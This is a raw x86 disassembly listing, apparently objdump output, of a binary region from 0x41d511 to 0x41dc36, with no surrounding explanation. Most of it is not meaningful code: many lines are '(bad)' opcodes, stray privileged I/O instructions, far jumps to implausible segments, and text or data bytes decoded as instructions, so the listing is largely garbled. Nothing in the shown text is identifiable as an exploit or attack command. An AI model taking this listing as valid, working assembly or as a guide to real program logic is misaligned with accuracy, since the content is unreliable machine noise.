  41d511:	dec    edi
  41d512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d513:	dec    edi
  41d514:	lahf   
  41d515:	dec    edi
  41d516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d517:	dec    edi
  41d518:	ins    DWORD PTR es:[edi],dx
  41d519:	dec    esi
  41d51a:	bound  ecx,QWORD PTR [esi+0x30]
  41d51d:	dec    esi
  41d51e:	add    BYTE PTR [eax],al
  41d520:	cdq    
  41d521:	dec    edi
  41d522:	pushf  
  41d523:	dec    edi
  41d524:	fwait
  41d525:	dec    edi
  41d526:	ins    DWORD PTR es:[edi],dx
  41d527:	dec    esi
  41d528:	bound  ecx,QWORD PTR [esi+0x30]
  41d52b:	dec    esi
  41d52c:	scas   eax,DWORD PTR es:[edi]
  41d52d:	dec    edi
  41d52e:	lods   eax,DWORD PTR ds:[esi]
  41d52f:	dec    edi
  41d530:	lahf   
  41d531:	dec    edi
  41d532:	mov    ds:0x624e6d4f,al
  41d537:	dec    esi
  41d538:	xor    BYTE PTR [esi+0x0],cl
  41d53b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41d541:	dec    edi
  41d542:	test   eax,0xa04f934f
  41d547:	dec    edi
  41d548:	fwait
  41d549:	dec    edi
  41d54a:	xor    BYTE PTR [esi+0x0],cl
  41d54d:	add    BYTE PTR [eax],al
  41d54f:	add    BYTE PTR [eax],al
  41d551:	add    BYTE PTR [eax],al
  41d553:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41d55a:	mov    WORD PTR [ebp-0x32734274],gs
  41d560:	mov    ebp,ds
  41d562:	mov    ebp,gs
  41d564:	mov    ebp,?
  41d566:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41d56c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41d572:	mov    WORD PTR [edx-0x74],?
  41d575:	jae    0x41d503
  41d577:	jo     0x41d505
  41d579:	jno    0x41d507
  41d57b:	jbe    0x41d509
  41d57d:	ja     0x41d50b
  41d57f:	je     0x41d50d
  41d581:	jne    0x41d50f
  41d583:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41d58a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41d590:	lods   al,BYTE PTR ds:[esi]
  41d591:	jge    0x41d54f
  41d593:	jge    0x41d533
  41d595:	(bad)  
  41d596:	jns    0x41d60b
  41d598:	mov    ecx,0x7d738cb1
  41d59d:	ins    DWORD PTR es:[edi],dx
  41d59e:	enter  0x9fc6,0x26
  41d5a2:	jb     0x41d5a7
  41d5a4:	test   eax,0xb956bb17
  41d5a9:	hlt    
  41d5aa:	test   al,0x37
  41d5ac:	test   al,0x7e
  41d5ae:	fnstenv [ecx-0x6a]
  41d5b1:	mov    cl,0x6a
  41d5b3:	push   0xffffffce
  41d5b5:	or     BYTE PTR [edx],bl
  41d5b7:	xlat   BYTE PTR ds:[ebx]
  41d5b8:	out    dx,eax
  41d5b9:	add    eax,0x9321d7aa
  41d5be:	scas   al,BYTE PTR es:[edi]
  41d5bf:	adc    DWORD PTR [esi],esp
  41d5c1:	jge    0x41d5e6
  41d5c3:	fidiv  WORD PTR [edi]
  41d5c5:	leave  
  41d5c6:	hlt    
  41d5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5c8:	cmp    ax,0x1fc8
  41d5cc:	mov    dh,cl
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	(bad)  
  41d5d0:	and    DWORD PTR [eax],ebx
  41d5d2:	and    DWORD PTR [ecx-0x18],esi
  41d5d5:	(bad)  [ebx+0x7]
  41d5d8:	cmc    
  41d5d9:	enter  0x301a,0x40
  41d5dd:	adc    BYTE PTR [edx+0x0],al
  41d5e0:	jno    0x41d648
  41d5e2:	jp     0x41d652
  41d5e4:	dec    eax
  41d5e5:	aam    0x41
  41d5e7:	add    BYTE PTR [esp+edx*8-0x12f7ffbf],ch
  41d5ee:	adc    al,BYTE PTR [edi]
  41d5f0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41d5f7:	ins    BYTE PTR es:[edi],dx
  41d5f8:	push   0x49657557
  41d5fd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41d603:	push   edi
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	inc    edx
  41d606:	push   0x76666a73
  41d60b:	inc    edx
  41d60c:	jo     0x41d657
  41d60e:	dec    ebp
  41d60f:	dec    ebp
  41d610:	pop    edx
  41d611:	jp     0x41d66d
  41d613:	jbe    0x41d65b
  41d615:	pop    ecx
  41d616:	jo     0x41d690
	...
  41d62c:	inc    ebp
  41d62d:	push   edx
  41d62e:	jb     0x41d6a4
  41d630:	inc    esi
  41d631:	je     0x41d674
  41d633:	inc    esi
  41d634:	jae    0x41d6ac
  41d636:	dec    ebx
  41d637:	gs inc edx
  41d639:	inc    bx
  41d63b:	push   ebp
  41d63c:	jno    0x41d6b4
  41d63e:	ja     0x41d6a7
  41d640:	dec    edi
  41d641:	dec    esp
  41d642:	dec    ebp
  41d643:	inc    edx
  41d644:	jno    0x41d6b7
  41d646:	jae    0x41d69b
  41d648:	dec    eax
  41d649:	inc    ebp
  41d64a:	inc    esp
  41d64b:	inc    esp
  41d64c:	push   ecx
  41d64d:	dec    edx
  41d64e:	ins    BYTE PTR es:[edi],dx
  41d64f:	dec    ebx
  41d650:	jbe    0x41d6c0
  41d652:	pop    eax
  41d653:	jbe    0x41d6a0
  41d655:	inc    ecx
  41d656:	fs gs jno 0x41d6c7
  41d65a:	push   ebx
  41d65b:	inc    ecx
  41d65c:	add    BYTE PTR [eax],al
  41d65e:	inc    ebx
  41d65f:	outs   dx,BYTE PTR ds:[esi]
  41d660:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41d664:	push   edx
  41d665:	push   ecx
  41d666:	push   0x74000064
  41d66b:	jne    0x41d6e2
  41d66d:	ins    DWORD PTR es:[edi],dx
  41d66e:	push   ecx
  41d66f:	push   eax
  41d670:	jo     0x41d6ec
  41d672:	addr16 jo 0x41d6cb
  41d675:	pop    eax
  41d676:	add    BYTE PTR [eax],al
  41d678:	push   ecx
  41d679:	pop    ecx
  41d67a:	inc    ebx
  41d67b:	inc    edx
  41d67c:	outs   dx,BYTE PTR ds:[esi]
  41d67d:	popa   
  41d67e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d682:	jne    0x41d6f2
  41d684:	dec    ebx
  41d685:	add    BYTE PTR [ecx+0x45],bh
  41d688:	bound  ebp,QWORD PTR [ecx+0x46]
  41d68b:	dec    ecx
  41d68c:	ja     0x41d6d3
  41d68e:	dec    eax
  41d68f:	inc    ebp
  41d690:	inc    edx
  41d691:	push   ebx
  41d692:	add    BYTE PTR [eax],al
  41d694:	je     0x41d6f9
  41d696:	bound  esp,QWORD PTR [edi+0x78]
  41d699:	dec    eax
  41d69a:	bound  edx,QWORD PTR [ebx+0x43]
  41d69d:	pop    eax
  41d69e:	outs   dx,DWORD PTR ds:[esi]
  41d69f:	push   0x4355
  41d6a4:	inc    edi
  41d6a5:	gs ins BYTE PTR es:[edi],dx
  41d6a7:	dec    esp
  41d6a8:	js     0x41d712
  41d6aa:	inc    edx
  41d6ab:	js     0x41d6f3
  41d6ad:	arpl   WORD PTR [eax],ax
  41d6af:	add    BYTE PTR [eax],al
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    BYTE PTR [edx+0x70],cl
  41d6b6:	jb     0x41d730
  41d6b8:	outs   dx,DWORD PTR ds:[esi]
  41d6b9:	pop    eax
  41d6ba:	dec    ebx
  41d6bb:	push   esp
  41d6bc:	dec    esp
  41d6bd:	jns    0x41d70a
  41d6bf:	js     0x41d739
  41d6c1:	outs   dx,BYTE PTR ds:[esi]
  41d6c2:	pop    ecx
  41d6c3:	jae    0x41d733
  41d6c5:	push   0x43644448
  41d6ca:	arpl   WORD PTR [edx+0x55],sp
  41d6cd:	push   0x42504e67
  41d6d2:	push   ebp
  41d6d3:	je     0x41d74a
  41d6d5:	addr16 dec edi
  41d6d7:	dec    esp
  41d6d8:	inc    edx
  41d6d9:	ins    DWORD PTR es:[edi],dx
  41d6da:	inc    esi
  41d6db:	inc    esi
  41d6dc:	inc    esi
  41d6dd:	arpl   WORD PTR [edx+0x47],bx
  41d6e0:	push   ebp
  41d6e1:	inc    ebx
  41d6e2:	popa   
  41d6e3:	push   edx
  41d6e4:	dec    esp
  41d6e5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6ec:	push   ecx
  41d6ed:	push   ebx
  41d6ee:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d6f5:	dec    edx
  41d6f6:	jns    0x41d761
  41d6f8:	push   edx
  41d6f9:	inc    ebx
  41d6fa:	jo     0x41d771
  41d6fc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d700:	fs push ebx
  41d702:	inc    ebx
  41d703:	push   ebp
  41d704:	push   eax
  41d705:	ja     0x41d781
  41d707:	jp     0x41d756
  41d709:	push   esi
  41d70a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d70e:	dec    edx
  41d70f:	dec    esi
  41d710:	data16 ja 0x41d761
  41d713:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d71a:	dec    esp
  41d71b:	cmp    ebx,ebp
  41d71d:	dec    esp
  41d71e:	lods   eax,DWORD PTR ds:[esi]
  41d71f:	out    dx,al
  41d720:	mov    ebp,0xa53ddffb
  41d725:	js     0x41d6e0
  41d727:	loop   0x41d719
  41d729:	push   ebx
  41d72a:	bound  ebp,QWORD PTR [ebp-0x51fffe6a]
  41d730:	add    BYTE PTR [eax],al
  41d732:	add    dl,cl
  41d734:	mov    ah,0x1b
  41d736:	test   BYTE PTR [ecx+0x46],bh
  41d739:	mov    eax,ds:0x9bb4115d
  41d73e:	mov    dh,0x2c
  41d740:	xchg   ecx,eax
  41d741:	push   0xffffffff
  41d743:	(bad)  
  41d744:	jle    0x41d709
  41d746:	mov    bl,0x62
  41d748:	cmc    
  41d749:	(bad)  
  41d74a:	lods   al,BYTE PTR ds:[esi]
  41d74b:	mov    ebx,0x397996a0
  41d750:	loope  0x41d71e
  41d752:	out    dx,al
  41d753:	adc    eax,0xa7e157f8
  41d758:	pop    edx
  41d759:	xchg   ecx,eax
  41d75a:	push   cs
  41d75b:	cdq    
  41d75c:	push   ds
  41d75d:	jnp    0x41d7c1
  41d75f:	or     DWORD PTR [ecx-0x2653080f],0xffffff93
  41d766:	jo     0x41d72d
  41d768:	jmp    FWORD PTR [eax+0x2ec3fcbc]
  41d76e:	mov    ebp,0x16122a15
  41d773:	sbb    DWORD PTR [ebp-0x7d],edx
  41d776:	sub    ebx,DWORD PTR [ebp+0x43]
  41d779:	fs jg  0x41d763
  41d77c:	mov    al,al
  41d77e:	or     BYTE PTR [esi-0xd],0x3d
  41d782:	mov    ebx,0x35c8aac1
  41d787:	test   BYTE PTR es:[edi+0x7a],ah
  41d78b:	gs cs gs loopne 0x41d75f
  41d790:	fdiv   DWORD PTR [edi]
  41d792:	xchg   DWORD PTR [edi],eax
  41d794:	(bad)  
  41d795:	jge    0x41d76c
  41d797:	inc    esp
  41d798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d799:	cli    
  41d79a:	mov    al,ds:0xd6810936
  41d79f:	or     eax,DWORD PTR [ebx-0x73732acd]
  41d7a5:	sbb    eax,0x457a8936
  41d7aa:	in     eax,dx
  41d7ab:	and    al,0xbd
  41d7ad:	jge    0x41d81d
  41d7af:	enter  0x9707,0x31
  41d7b3:	lahf   
  41d7b4:	aaa    
  41d7b5:	jmp    0x41d7fb
  41d7b7:	xchg   edi,eax
  41d7b8:	or     ch,BYTE PTR [ecx]
  41d7ba:	cdq    
  41d7bb:	push   ecx
  41d7bc:	out    0x19,al
  41d7be:	jno    0x41d815
  41d7c0:	lea    ebp,[esi]
  41d7c2:	sub    BYTE PTR [edi+0x1eb45a32],ah
  41d7c8:	outs   dx,DWORD PTR ds:[esi]
  41d7c9:	jle    0x41d784
  41d7cb:	jmp    FWORD PTR ds:0x1d4afea9
  41d7d1:	ja     0x41d79d
  41d7d3:	adc    DWORD PTR [ebx-0xe],eax
  41d7d6:	outs   dx,DWORD PTR ds:[esi]
  41d7d7:	mov    esi,0x28de2526
  41d7dc:	(bad)  
  41d7dd:	xchg   ebx,eax
  41d7de:	push   esi
  41d7df:	das    
  41d7e0:	sbb    al,0x0
	...
  41d7ea:	add    BYTE PTR [eax],ch
  41d7ec:	mov    dl,0xa5
  41d7ee:	push   edx
  41d7ef:	mov    edi,0x7cfaff57
  41d7f4:	xlat   BYTE PTR fs:[ebx]
  41d7f6:	push   esi
  41d7f7:	outs   dx,DWORD PTR ds:[esi]
  41d7f8:	or     esp,eax
  41d7fa:	ja     0x41d857
  41d7fc:	xchg   edi,eax
  41d7fd:	add    DWORD PTR [eax],eax
  41d7ff:	scas   al,BYTE PTR es:[edi]
  41d800:	add    BYTE PTR [eax],al
  41d802:	add    BYTE PTR [edx+0x72],bh
  41d805:	sbb    esi,ebx
  41d807:	xchg   ebp,eax
  41d808:	push   eax
  41d809:	xlat   BYTE PTR ds:[ebx]
  41d80a:	inc    esp
  41d80b:	jb     0x41d7fa
  41d80d:	stos   DWORD PTR es:[edi],eax
  41d80e:	mov    bh,0xff
  41d810:	push   cs
  41d811:	mov    dl,0x9
  41d813:	pop    ds
  41d814:	mov    WORD PTR [eax+0x1c8485e3],es
  41d81a:	mov    dl,0xbe
  41d81c:	pop    ds
  41d81d:	or     al,0xd9
  41d81f:	sahf   
  41d820:	dec    edx
  41d821:	xchg   BYTE PTR [ecx+eax*1-0x74],cl
  41d825:	loope  0x41d81a
  41d827:	bsr    ebx,eax
  41d82a:	or     DWORD PTR [eax],esi
  41d82c:	out    dx,al
  41d82d:	sbb    eax,DWORD PTR [edx-0x4f]
  41d830:	frstor [edx]
  41d832:	gs push ecx
  41d834:	and    edi,DWORD PTR [ebx]
  41d836:	dec    esi
  41d837:	dec    ecx
  41d838:	leave  
  41d839:	sti    
  41d83a:	outs   dx,BYTE PTR ds:[esi]
  41d83b:	cmc    
  41d83c:	gs enter 0x857,0xf6
  41d841:	jle    0x41d836
  41d843:	jl     0x41d8a4
  41d845:	test   al,0xf0
  41d847:	cmp    al,0x70
  41d849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d84a:	adc    ah,al
  41d84c:	retf   
  41d84d:	(bad)  
  41d84e:	(bad)  
  41d84f:	in     al,dx
  41d850:	inc    ebp
  41d851:	xchg   ecx,eax
  41d852:	push   ecx
  41d853:	scas   al,BYTE PTR es:[edi]
  41d854:	push   0xffffffad
  41d856:	xor    eax,0xa1e15a7a
  41d85b:	sahf   
  41d85c:	lds    edx,FWORD PTR [ebx-0x2dd033c9]
  41d862:	in     al,dx
  41d863:	scas   eax,DWORD PTR es:[edi]
  41d864:	mov    WORD PTR [edx],ss
  41d866:	xor    ch,al
  41d868:	jl     0x41d8af
  41d86a:	push   0xffffffcb
  41d86c:	xor    bl,BYTE PTR [ecx-0x32]
  41d86f:	pop    eax
  41d870:	lahf   
  41d871:	mov    BYTE PTR [ebp+0x0],dl
  41d874:	aas    
  41d875:	aas    
  41d876:	fsubr  st,st(3)
  41d878:	retf   
  41d879:	mov    edx,0x2797b745
  41d87e:	cwde   
  41d87f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d880:	dec    eax
  41d881:	fistp  QWORD PTR [ecx-0x3ffdf785]
  41d887:	cmp    eax,ecx
  41d889:	leave  
  41d88a:	jl     0x41d8b5
  41d88c:	sbb    ecx,DWORD PTR [esi-0x35]
  41d88f:	pop    ds
  41d890:	in     eax,0x9c
  41d892:	sub    edx,DWORD PTR [esi-0x5c0dfac0]
  41d898:	mov    ecx,0x1a269f8e
  41d89d:	pop    esp
  41d89e:	fdivr  st(6),st
  41d8a0:	or     DWORD PTR [eax+0x32],edx
  41d8a3:	sbb    esi,DWORD PTR [esi]
  41d8a5:	xchg   ecx,eax
  41d8a6:	mulps  xmm4,XMMWORD PTR [eax]
  41d8a9:	push   es
  41d8aa:	fwait
  41d8ab:	sbb    ah,BYTE PTR [edx]
  41d8ad:	mov    bl,0xf9
  41d8af:	pop    edx
  41d8b0:	repnz add BYTE PTR [eax],al
	...
  41d8bb:	mov    bl,0x55
  41d8bd:	jg     0x41d840
  41d8bf:	jmp    FWORD PTR [ebx-0x69418801]
  41d8c5:	push   0xe86d1257
  41d8ca:	mov    DWORD PTR [ecx],ecx
  41d8cc:	cwde   
  41d8cd:	add    DWORD PTR [eax],eax
  41d8cf:	scas   al,BYTE PTR es:[edi]
  41d8d0:	add    BYTE PTR [eax],al
  41d8d2:	add    BYTE PTR [ebx+0x5d],bh
  41d8d5:	mov    BYTE PTR [ecx+0xf],0x2d
  41d8d9:	adc    esp,DWORD PTR ds:0xb9b47b02
  41d8df:	pop    edi
  41d8e0:	fcom   DWORD PTR [ecx-0xbc4c2f]
  41d8e6:	inc    DWORD PTR [edi]
  41d8e8:	sbb    ah,BYTE PTR [ebp+0x4f9b0926]
  41d8ee:	das    
  41d8ef:	pop    edi
  41d8f0:	push   ebp
  41d8f1:	jge    0x41d909
  41d8f3:	mov    dh,0x4
  41d8f5:	into   
  41d8f6:	mov    fs,WORD PTR [edi-0x310351b8]
  41d8fc:	es fwait
  41d8fe:	repz jb 0x41d8b1
  41d901:	std    
  41d902:	sbb    ch,cl
  41d904:	repnz add eax,0xfe785460
  41d90a:	loopne 0x41d95d
  41d90c:	push   edi
  41d90d:	xor    edx,DWORD PTR [edi+0x7dbcf896]
  41d913:	icebp  
  41d914:	cdq    
  41d915:	xchg   ebp,eax
  41d916:	inc    edx
  41d917:	call   0x438b:0xd1520199
  41d91e:	scas   eax,DWORD PTR es:[edi]
  41d91f:	pop    ecx
  41d920:	push   0xab97a3e4
  41d925:	cmp    al,0x32
  41d927:	xor    al,0xd1
  41d929:	adc    ebp,0x21
  41d92c:	pop    ecx
  41d92d:	xchg   BYTE PTR ss:[edx],dl
  41d930:	mov    ch,0x9f
  41d932:	jge    0x41d965
  41d934:	mov    es,WORD PTR [ebx-0x29]
  41d937:	js     0x41d91b
  41d939:	pop    edi
  41d93a:	and    DWORD PTR [edx+0x32],ebx
  41d93d:	sub    eax,0xba2e8d80
  41d942:	inc    esi
  41d943:	or     DWORD PTR [edi-0x5a],edi
  41d946:	addr16 cmc 
  41d948:	or     eax,0xba1ea82f
  41d94d:	psrad  mm1,mm0
  41d950:	mov    al,0x75
  41d952:	sub    eax,0xf03f27e
  41d957:	xchg   edx,eax
  41d958:	(bad)  
  41d959:	aas    
  41d95a:	cmp    DWORD PTR [eax-0x80],0x70
  41d95e:	ret    0xe78e
  41d961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d962:	push   ss
  41d963:	dec    ebp
  41d964:	mov    ds:0x49f1c7e6,eax
  41d969:	or     BYTE PTR [ecx+0x3e],bh
  41d96c:	sbb    ebx,eax
  41d96e:	out    0xff,al
  41d970:	pop    ebx
  41d971:	aas    
  41d972:	mov    al,ds:0xd4708c44
  41d977:	push   bp
  41d979:	cmc    
  41d97a:	bound  esp,QWORD PTR fs:[ecx+0x1709f108]
	...
  41d989:	add    BYTE PTR [eax],al
  41d98b:	cmp    dh,dl
  41d98d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d990:	in     al,dx
  41d991:	fimul  WORD PTR ds:[edi+0x54ac6bd5]
  41d998:	cmp    ah,BYTE PTR [ecx+0x55]
  41d99b:	mov    bh,0x98
  41d99d:	add    DWORD PTR [eax],eax
  41d99f:	scas   al,BYTE PTR es:[edi]
  41d9a0:	add    BYTE PTR [eax],al
  41d9a2:	add    BYTE PTR [esi],dl
  41d9a4:	shl    BYTE PTR gs:[esi+0x10a01150],cl
  41d9ab:	pop    edi
  41d9ac:	and    al,0x37
  41d9ae:	push   0xfffffff4
  41d9b0:	mov    edx,0x308e924a
  41d9b5:	adc    eax,0xe80bef51
  41d9ba:	pop    esi
  41d9bb:	inc    edi
  41d9bc:	xor    al,0xce
  41d9be:	jmp    0x41d9d7
  41d9c0:	xlat   BYTE PTR ds:[ebx]
  41d9c1:	in     eax,dx
  41d9c2:	addps  xmm7,xmm3
  41d9c5:	push   ecx
  41d9c6:	hlt    
  41d9c7:	jb     0x41da48
  41d9c9:	and    dh,BYTE PTR [ecx+0x2ba5face]
  41d9cf:	push   ds
  41d9d0:	(bad)  [edx]
  41d9d2:	jge    0x41d9a9
  41d9d4:	pop    esi
  41d9d5:	fadd   QWORD PTR [eax+ebx*2+0x7d]
  41d9d9:	loope  0x41da1a
  41d9db:	mov    al,0xee
  41d9dd:	mov    esi,0xff25642c
  41d9e2:	mov    BYTE PTR [ecx-0x13],dh
  41d9e5:	stos   DWORD PTR es:[edi],eax
  41d9e6:	test   edi,eax
  41d9e8:	les    ebx,FWORD PTR [edx-0x11c404a4]
  41d9ee:	sti    
  41d9ef:	inc    ebp
  41d9f0:	inc    edx
  41d9f1:	nop
  41d9f2:	hlt    
  41d9f3:	shl    BYTE PTR [eax],1
  41d9f5:	into   
  41d9f6:	cmp    DWORD PTR [edx+0x472dbf65],0x5f311df2
  41da00:	mov    eax,ds:0x8a124e42
  41da05:	fbld   TBYTE PTR [edi]
  41da07:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41da09:	popf   
  41da0a:	and    ch,BYTE PTR [edi-0x59]
  41da0d:	add    BYTE PTR [eax+eax*2-0x2e4a086],bh
  41da14:	test   DWORD PTR [ecx-0x542c515b],esi
  41da1a:	mov    esi,0x4c18149a
  41da1f:	add    al,0x19
  41da21:	popf   
  41da22:	test   al,0xa7
  41da24:	sbb    al,BYTE PTR [ebx+0x6b]
  41da27:	mov    edx,0x5e6a2cb2
  41da2c:	(bad)  
  41da2d:	push   ebp
  41da2e:	mov    bl,0x15
  41da30:	jmp    0x86ff:0x420d9245
  41da37:	jmp    0x41da6a
  41da39:	sbb    ebp,DWORD PTR [ecx-0x15]
  41da3c:	shr    BYTE PTR [eax-0x71],cl
  41da3f:	pop    ds
  41da40:	fs mov esi,esp
  41da43:	sub    al,0x99
  41da45:	leave  
  41da46:	into   
  41da47:	fdivr  st,st(1)
  41da49:	push   ds
  41da4a:	(bad)  [eax-0x6d]
  41da4d:	fistp  QWORD PTR [ebp+0x1f]
  41da50:	sldt   WORD PTR [eax]
	...
  41da5b:	fnstenv [esi-0x2490e49a]
  41da61:	std    
  41da62:	neg    BYTE PTR [esi]
  41da64:	sub    esp,DWORD PTR [ebx-0x23]
  41da67:	icebp  
  41da68:	neg    DWORD PTR [ebp+0x1996511]
  41da6e:	add    BYTE PTR [esi+0x56000000],ch
  41da74:	or     eax,0x962dacb2
  41da79:	lock mov ebp,0x8ebe8614
  41da7f:	fldcw  WORD PTR [esi]
  41da81:	xchg   esi,eax
  41da82:	(bad)  
  41da83:	xor    al,0x58
  41da85:	nop
  41da86:	mov    al,ds:0x727be996
  41da8b:	dec    ebx
  41da8c:	fs cli 
  41da8e:	test   eax,0x60c70306
  41da93:	inc    ebx
  41da94:	jo     0x41da42
  41da96:	inc    ebx
  41da97:	mov    bh,0x21
  41da99:	lock sub DWORD PTR [edi+0x41f21b89],edi
  41daa0:	mov    bl,0x17
  41daa2:	xchg   edi,eax
  41daa3:	add    ebx,esi
  41daa5:	and    eax,edi
  41daa7:	jl     0x41db1c
  41daa9:	sti    
  41daaa:	retf   
  41daab:	daa    
  41daac:	aam    0xab
  41daae:	ficomp DWORD PTR [ebx+0x229afedd]
  41dab4:	pop    ecx
  41dab5:	inc    eax
  41dab6:	das    
  41dab7:	xchg   ebp,eax
  41dab8:	add    DWORD PTR [edi+ecx*1-0x51],esi
  41dabc:	cdq    
  41dabd:	int    0x9a
  41dabf:	adc    eax,0xcd52224b
  41dac4:	add    BYTE PTR [edi+0x7be3165f],0x8
  41dacb:	mov    BYTE PTR [esi+esi*2+0x68],dl
  41dacf:	test   DWORD PTR [esi+ebx*4],ebx
  41dad2:	mov    dl,0xd0
  41dad4:	dec    edi
  41dad5:	(bad)  
  41dad6:	mov    eax,ds:0x5cea961b
  41dadb:	xor    BYTE PTR [ebp-0x1adf5cbd],ch
  41dae1:	push   ebx
  41dae2:	pop    edi
  41dae3:	and    BYTE PTR [ebx+edx*2-0x4b],dh
  41dae7:	xchg   ebx,eax
  41dae8:	retf   
  41dae9:	(bad)  
  41daea:	add    bh,ah
  41daec:	mov    BYTE PTR [edi],ah
  41daee:	pop    ds
  41daef:	mov    ds:0xadda5c2,al
  41daf4:	icebp  
  41daf5:	icebp  
  41daf6:	fsubr  QWORD PTR [ecx-0x4a]
  41daf9:	mov    esp,0x1b48db32
  41dafe:	stc    
  41daff:	ins    DWORD PTR es:[edi],dx
  41db00:	loope  0x41db38
  41db02:	hlt    
  41db03:	pop    edx
  41db04:	jo     0x41db43
  41db06:	cmp    DWORD PTR [edx+ebx*1],ecx
  41db09:	(bad)  
  41db0b:	push   ds
  41db0c:	daa    
  41db0d:	sub    BYTE PTR [esi+0x73],dl
  41db10:	test   al,0xac
  41db12:	aas    
  41db13:	(bad)  
  41db14:	loope  0x41db3f
  41db16:	loopne 0x41db28
  41db18:	fwait
  41db19:	xor    al,BYTE PTR [esi]
  41db1b:	mov    ah,0xe9
  41db1d:	xchg   DWORD PTR [esi+0x79],ebx
  41db20:	sub    al,0x0
	...
  41db2a:	add    dl,bl
  41db2c:	xor    dl,BYTE PTR [edi-0x20500076]
  41db32:	jb     0x41db37
  41db34:	inc    ebp
  41db35:	mov    ds:0xd5eebb5c,eax
  41db3a:	and    dl,BYTE PTR [ebx]
  41db3c:	call   0x0:0xae0001
  41db43:	int3   
  41db44:	outs   dx,BYTE PTR ds:[esi]
  41db45:	shl    BYTE PTR [ecx-0x7e],cl
  41db48:	jbe    0x41dbaa
  41db4a:	inc    edx
  41db4b:	inc    eax
  41db4c:	aad    0x3a
  41db4e:	(bad)  
  41db4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db50:	in     al,0xd6
  41db52:	jmp    0xe005253d
  41db57:	jmp    0x8dcc:0xb750f785
  41db5e:	and    eax,0x2ae75267
  41db63:	mov    ebp,0x36f37819
  41db68:	shr    DWORD PTR [ebx-0x6e],0x76
  41db6c:	aad    0xa1
  41db6e:	ss push ebx
  41db70:	jae    0x41db94
  41db72:	lock fxch st(7)
  41db75:	out    dx,al
  41db76:	xor    BYTE PTR [ebp+0x7],0x78
  41db7a:	pop    eax
  41db7b:	pusha  
  41db7c:	adc    al,0x23
  41db7e:	push   ss
  41db7f:	mov    dh,0x8c
  41db81:	aas    
  41db82:	int3   
  41db83:	(bad)
  41db86:	fcmovnb st,st(1)
  41db88:	rcr    BYTE PTR [ecx],1
  41db8a:	ja     0x41db83
  41db8c:	arpl   WORD PTR [ecx],bp
  41db8e:	sahf   
  41db8f:	sub    dh,BYTE PTR [ebx+ecx*8-0x18]
  41db93:	fstp   TBYTE PTR [ecx]
  41db95:	push   ds
  41db96:	loop   0x41dbc8
  41db98:	sub    BYTE PTR [ecx],ah
  41db9a:	loopne 0x41dba6
  41db9c:	aad    0xc7
  41db9e:	xor    esi,esi
  41dba0:	(bad)  
  41dba1:	sbb    bh,ch
  41dba3:	int    0x77
  41dba5:	xor    DWORD PTR [edi+0x77],ecx
  41dba8:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbaa:	push   ebp
  41dbab:	mov    esp,0x8ce74f61
  41dbb0:	sbb    DWORD PTR [ebx+0x21],eax
  41dbb3:	stos   BYTE PTR es:[edi],al
  41dbb4:	dec    esp
  41dbb5:	sti    
  41dbb6:	out    0x30,eax
  41dbb8:	(bad)  
  41dbba:	and    al,0xf9
  41dbbc:	xchg   edi,eax
  41dbbd:	jmp    0x8632:0x5d07d7a5
  41dbc4:	ss add al,0x9
  41dbc7:	pushf  
  41dbc8:	jbe    0x41db61
  41dbca:	ds sbb al,0x29
  41dbcd:	ret    0x2dbc
  41dbd0:	sti    
  41dbd1:	or     edx,DWORD PTR [edx+0x5f]
  41dbd4:	shl    BYTE PTR [bp+si],0x8a
  41dbd8:	stos   DWORD PTR es:[edi],eax
  41dbd9:	iret   
  41dbda:	sbb    bl,al
  41dbdc:	rol    BYTE PTR [eax-0x554cc596],cl
  41dbe2:	mov    WORD PTR [edi-0x5a1847c7],?
  41dbe8:	mov    ecx,DWORD PTR [ecx]
  41dbea:	add    DWORD PTR [eax+ebp*2-0x2a1a8b09],ebp
	...
  41dbf9:	add    BYTE PTR [eax],al
  41dbfb:	dec    eax
  41dbfc:	in     al,0x3
  41dbfe:	fwait
  41dbff:	scas   eax,DWORD PTR es:[edi]
  41dc00:	(bad)  
  41dc01:	fdiv   st,st(7)
  41dc03:	pop    esi
  41dc04:	sub    BYTE PTR [eax-0x52868271],bl
  41dc0a:	xor    cl,al
  41dc0c:	call   0x0:0xae0001
  41dc13:	xchg   DWORD PTR [eax],ecx
  41dc15:	adc    eax,0x772860da
  41dc1a:	mov    esp,0xbac30c53
  41dc1f:	fnstsw WORD PTR [edx]
  41dc21:	pop    ecx
  41dc22:	mov    ds:0x8f6c83a3,eax
  41dc27:	xcrypt-ofb (bad)
  41dc28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dc29:	outs   dx,DWORD PTR ds:[esi]
  41dc2a:	ja     0x41dbfb
  41dc2c:	push   edi
  41dc2d:	outs   dx,BYTE PTR ds:[esi]
  41dc2e:	loop   0x41dc95
  41dc30:	sbb    al,ch
  41dc32:	(bad)
  41dc35:	cmc    
  41dc36:	dec    eax
